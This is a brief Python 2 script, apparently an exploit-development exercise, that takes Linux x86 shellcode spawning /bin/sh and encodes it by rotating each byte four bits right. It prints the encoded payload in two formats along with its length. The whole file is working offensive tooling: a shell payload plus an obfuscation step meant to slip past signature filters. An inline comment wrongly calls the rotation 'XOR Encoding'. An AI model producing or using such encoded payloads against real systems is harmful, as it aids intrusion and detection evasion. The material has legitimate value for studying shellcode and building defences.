#!/usr/bin/python

# Python ROR Encoder 

ror = lambda val, r_bits, max_bits: \
    ((val & (2**max_bits-1)) >> r_bits%max_bits) | \
    (val << (max_bits-(r_bits%max_bits)) & (2**max_bits-1))

#print "%x" % ror(0xff, 4, 8)
#print "%x" % ror(0x00, 4, 8)
#print "%x" % ror(0x1, 4, 8)
#print "%x" % ror(0xf, 4, 8)


shellcode = ("\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80")
#shellcode = ("\x13\x0c\x05\x86\xf2\xf2\x37\x86\x86\xf2\x26\x96\xe6\x98\x3e\x05\x98\x2e\x35\x98\x1e\x0b\xb0\xdc\x08")

encoded = ""
encoded2 = ""

print 'Encoded shellcode ...'

for x in bytearray(shellcode) :
	# XOR Encoding 	
	y = ror(x, 4, 8)
	encoded += '\\x'
	encoded += '%02x' % y

	encoded2 += '0x'
	encoded2 += '%02x,' %y


print encoded

print encoded2

print 'Len: %d' % len(bytearray(shellcode))
